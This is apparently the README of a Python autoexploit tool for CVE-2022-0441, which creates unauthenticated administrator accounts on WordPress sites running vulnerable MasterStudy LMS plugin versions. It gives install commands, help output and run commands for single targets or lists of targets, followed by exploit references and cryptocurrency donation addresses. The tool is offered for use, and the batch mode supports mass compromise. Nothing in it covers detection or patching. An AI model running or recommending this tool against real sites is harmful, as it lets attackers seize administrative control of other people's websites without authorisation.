# CVE-2022-0441
[![made-with-python](https://img.shields.io/badge/Made%20with-Python-1f425f.svg)](https://www.python.org/)
```
Title: WordPress Plugin MasterStudy LMS 2.7.5 - Unauthenticated Admin Account Creation
Date: 16.02.2022
Author: Numan Türle
CVE: CVE-2022-0441
Software Link: https://wordpress.org/plugins/masterstudy-lms-learning-management-system/
Version: <2.7.6
```

### Installation
```
git clone https://github.com/biulove0x/CVE-2022-0441.git
cd CVE-2022-0441/
python3 -m pip install -r requirements.txt
```

### How to run autoexploit
```
$ python3 MasterStudy.py --help
###############################################
# @author : biulove0x                         #
# @name   : WP Plugins Master Study Exploiter #
# @cve    : CVE-2022-0441                     #
###############################################

usage: MasterStudy.py [-h] [-t example.com] [-l target.txt]

CVE-2022-0441 [ WordPress Plugin MasterStudy LMS 2.7.5 - Unauthenticated Admin Account Creation ]

optional arguments:
  -h, --help      show this help message and exit
  -t example.com  Single target
  -l target.txt   Multiple target
```

#### Single target
```
$ python3 MasterStudy.py -t http://example.com/
```

#### Multiple target
```
$ cat domains.txt
http://example.com/
https://examples.com/

$ python3 MasterStudy.py -l target.txt
```

### References :

* https://www.exploit-db.com/exploits/50752
* https://www.youtube.com/watch?v=SI_O6CHXMZk
* https://gist.github.com/numanturle/4762b497d3b56f1a399ea69aa02522a6
* https://wpscan.com/vulnerability/173c2efe-ee9c-4539-852f-c242b4f728ed

### Donate :
BTC : bc1qst09sxcnq97a4wgsqvpkg4fxyjczvs3xe7278h

BNB : bnb1jhp2hv9utr8u97387p35fmftgr8wpjp39altz0

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/biulove0x)
